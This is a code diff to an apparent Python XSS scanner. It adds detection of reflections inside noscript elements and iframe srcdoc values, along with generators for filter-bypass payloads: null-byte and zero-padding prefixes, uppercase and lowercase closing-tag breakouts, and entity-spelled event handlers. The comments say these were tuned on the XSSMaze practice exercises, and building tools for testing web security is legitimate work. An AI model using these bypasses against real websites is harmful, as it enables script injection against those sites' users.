@@ -150,6 +150,15 @@ def profile_reflection(response_text: str, token: str) -> dict | None:
         "chars_stripped": stripped,
         "chars_encoded": encoded,
         "rcdata_tag": detect_rcdata_tag(response_text, idx),
+        # Phase 364: two more inert-text hosts measured on XSSMaze.
+        # <noscript> body text is RAW TEXT while scripting is enabled, so
+        # a direct <script>/<img> inside it never runs; only a closing-tag
+        # breakout does.  iframe[srcdoc] is the opposite: its value IS
+        # parsed as a document, but a sanitizer upstream may strip the
+        # trigger characters, so an entity-encoded handler name can still
+        # reach the browser intact.
+        "noscript_tag": detect_noscript_rawtext(response_text, idx),
+        "srcdoc_host": detect_srcdoc_host(response_text, idx),
         "probe": build_probe(token),
         "detail": "reflection profile: " + (", ".join(parts) if parts
                                             else "nothing survived"),
@@ -438,6 +447,39 @@ def detect_rcdata_tag(response_text: str, token_idx: int) -> str | None:
     return None
 
 
+def detect_noscript_rawtext(response_text: str, token_idx: int) -> bool:
+    """Return True when the token sits inside an unclosed ``<noscript>``.
+
+    With scripting enabled a body-level ``<noscript>`` element is parsed in
+    RAWTEXT mode: its content is text until ``</noscript>``, so a
+    ``<script>`` or ``<img onerror>`` echoed inside it is inert.  Measured
+    Phase 364 on XSSMaze noscript/level3-4: the answer shape is the
+    closing-tag breakout, and level3 additionally filters the lowercase
+    closing tag, so the uppercase spelling is the one that survives.
+    """
+    if not response_text or token_idx < 0 or token_idx >= len(response_text):
+        return False
+    before = response_text[:token_idx].lower()
+    last_open = before.rfind("<noscript")
+    if last_open == -1:
+        return False
+    return before.find("</noscript>", last_open) == -1
+
+
+def detect_srcdoc_host(response_text: str, token_idx: int) -> bool:
+    """Return True when the token sits inside an open ``srcdoc="`` value."""
+    if not response_text or token_idx < 0 or token_idx >= len(response_text):
+        return False
+    before = response_text[:token_idx]
+    m = None
+    for cand in re.finditer(r"srcdoc\s*=\s*(\"|')", before, re.I):
+        m = cand
+    if m is None:
+        return False
+    quote = m.group(1)
+    return quote not in before[m.end():]
+
+
 def breakout_prefix(tag_name: str | None) -> str:
     """Closing-tag prefix that escapes the RCDATA element (empty if none)."""
     if tag_name in RCDATA_TAGS:
@@ -498,6 +540,205 @@ def surface_rcdata_breakouts(profile: dict | None, bases: list,
     if not variants:
         return bases, None
     return variants + list(bases), tag
+
+
+# ---------------------------------------------------------------------------
+# Phase 364: the three shapes measured on the remaining XSSMaze query gaps.
+# ---------------------------------------------------------------------------
+
+#: Prefixes that neutralise a whole-value filter.  ``\x00`` makes a
+#: substring check miss the tag while a browser still parses it (measured
+#: XSSMaze edge/level1: ANY value containing ``<`` is replaced by
+#: ``Blocked``).  The ten zeroes pad past an encoder that entity-encodes
+#: only the FIRST N characters of the input (measured encodingedge/level4:
+#: N=10, ``0000000000<script>`` comes back raw).
+PREFIX_BYPASS_PREFIXES: tuple[str, ...] = ("\x00", "0" * 10)
+
+#: First-letter entity spelling of an ``on*`` handler name.  A sanitizer
+#: that looks for the literal handler name before decoding entities misses
+#: ``on&#101;rror``, while the browser decodes it into a live handler
+#: (measured XSSMaze html5-sanitizer/level2, iframe[srcdoc]).
+_HANDLER_NAME_RE = re.compile(r"(\bon)([a-z]{2,})(\s*=)", re.I)
+
+
+def _entity_first_letter(m) -> str:
+    name = m.group(2)
+    return f"on&#{ord(name[0].lower())};{name[1:]}{m.group(3)}"
+
+
+def entity_spell_handler(payload: str, count: int = 1) -> str:
+    """Rewrite the first ``on*`` handler name with a decimal entity."""
+    return _HANDLER_NAME_RE.sub(_entity_first_letter, payload, count=count)
+
+
+def surface_prefix_bypasses(bases: list, prefixes=PREFIX_BYPASS_PREFIXES,
+                            limit: int = 2) -> tuple[list, str | None]:
+    """Prepend prefix-padded variants of the leading payloads.
+
+    Caller-side gate: only when the sandwich probe was rejected while the
+    plain marker still reflected, i.e. the endpoint rejects probe characters
+    wholesale.  On a healthy endpoint the variants are never generated, so
+    request counts are untouched.
+    """
+    if not bases or not prefixes:
+        return bases, None
+    seen: set[str] = set()
+    variants: list = []
+    for b in bases[:limit]:
+        if not isinstance(b, dict):
+            continue
+        pl = b.get("payload") or ""
+        if not pl:
+            continue
+        for prefix in prefixes:
+            vp = prefix + pl
+            if vp in seen:
+                continue
+            seen.add(vp)
+            v = dict(b)
+            v["payload"] = vp
+            v["context"] = "prefix_bypass"
+            variants.append(v)
+    if not variants:
+        return bases, None
+    return variants + list(bases), "prefix_bypass"
+
+
+def surface_prefix_bypass_strs(cands: list, prefixes=PREFIX_BYPASS_PREFIXES,
+                               limit: int = 2) -> tuple[list, str | None]:
+    """String-list variant of :func:`surface_prefix_bypasses`."""
+    if not cands or not prefixes:
+        return cands, None
+    seen: set = set(cands)
+    variants: list = []
+    for pl in cands[:limit]:
+        if not pl:
+            continue
+        for prefix in prefixes:
+            vp = prefix + pl
+            if vp in seen:
+                continue
+            seen.add(vp)
+            variants.append(vp)
+    if not variants:
+        return cands, None
+    return variants + list(cands), "prefix_bypass"
+
+
+def surface_noscript_breakouts(profile: dict | None, bases: list,
+                               limit: int = 3,
+                               seeds: list | None = None) -> tuple[list, str | None]:
+    """Prepend ``</noscript>`` breakout variants (both case spellings).
+
+    ``<noscript>`` content is RAWTEXT, so the injection only executes after
+    the element is closed.  The uppercase spelling is included because the
+    level3 exercise filters the lowercase closing tag (measured Phase 364).
+
+    ``seeds`` lets the caller supply HTML-element payloads when the
+    reflection was classified as a different context (level4 echoes the
+    token inside a meta-refresh URL, so the URL corpus carries no tag that
+    could break out).
+    """
+    if not profile or not profile.get("noscript_tag"):
+        return bases, None
+    src = seeds if seeds else bases
+    if not src:
+        return bases, None
+    seen: set[str] = set()
+    variants: list = []
+    for b in src[:limit]:
+        if not isinstance(b, dict):
+            continue
+        pl = b.get("payload") or ""
+        if not pl:
+            continue
+        for prefix in ("</noscript>", "</NOSCRIPT>"):
+            vp = prefix + pl
+            if vp in seen:
+                continue
+            seen.add(vp)
+            v = dict(b)
+            v["payload"] = vp
+            v["context"] = "noscript_breakout"
+            v["rcdata_tag"] = "noscript"
+            variants.append(v)
+    if not variants:
+        return bases, None
+    return variants + list(bases), "noscript"
+
+
+def surface_noscript_breakout_strs(profile: dict | None, cands: list,
+                                   limit: int = 3) -> tuple[list, str | None]:
+    """String-list variant of :func:`surface_noscript_breakouts`."""
+    if not profile or not profile.get("noscript_tag") or not cands:
+        return cands, None
+    seen: set = set(cands)
+    variants: list = []
+    for pl in cands[:limit]:
+        if not pl:
+            continue
+        for prefix in ("</noscript>", "</NOSCRIPT>"):
+            vp = prefix + pl
+            if vp in seen:
+                continue
+            seen.add(vp)
+            variants.append(vp)
+    if not variants:
+        return cands, None
+    return variants + list(cands), "noscript"
+
+
+def surface_srcdoc_entities(profile: dict | None, bases: list,
+                            limit: int = 2) -> tuple[list, str | None]:
+    """Prepend entity-spelled handler variants for an ``srcdoc`` reflection.
+
+    The srcdoc value IS parsed as a document, so an ``<img onerror>`` inside
+    it executes -- but a sanitizer that runs before the browser strips the
+    literal trigger.  Spelling the first letter of the handler as a decimal
+    entity survives the textual check and decodes into a live handler in the
+    browser (measured XSSMaze html5-sanitizer/level2).
+    """
+    if not profile or not profile.get("srcdoc_host") or not bases:
+        return bases, None
+    seen: set[str] = set()
+    variants: list = []
+    for b in bases[:limit]:
+        if not isinstance(b, dict):
+            continue
+        pl = b.get("payload") or ""
+        if not pl:
+            continue
+        enc = entity_spell_handler(pl)
+        if enc == pl or enc in seen:
+            continue
+        seen.add(enc)
+        v = dict(b)
+        v["payload"] = enc
+        v["context"] = "srcdoc_entity"
+        variants.append(v)
+    if not variants:
+        return bases, None
+    return variants + list(bases), "srcdoc_entity"
+
+
+def surface_srcdoc_entity_strs(profile: dict | None, cands: list,
+                               limit: int = 2) -> tuple[list, str | None]:
+    """String-list variant of :func:`surface_srcdoc_entities`."""
+    if not profile or not profile.get("srcdoc_host") or not cands:
+        return cands, None
+    seen: set = set(cands)
+    variants: list = []
+    for pl in cands[:limit]:
+        if not pl:
+            continue
+        enc = entity_spell_handler(pl)
+        if enc == pl or enc in seen:
+            continue
+        seen.add(enc)
+        variants.append(enc)
+    if not variants:
+        return cands, None
+    return variants + list(cands), "srcdoc_entity"
 
 
 def surface_rcdata_breakout_strs(profile: dict | None, cands: list,
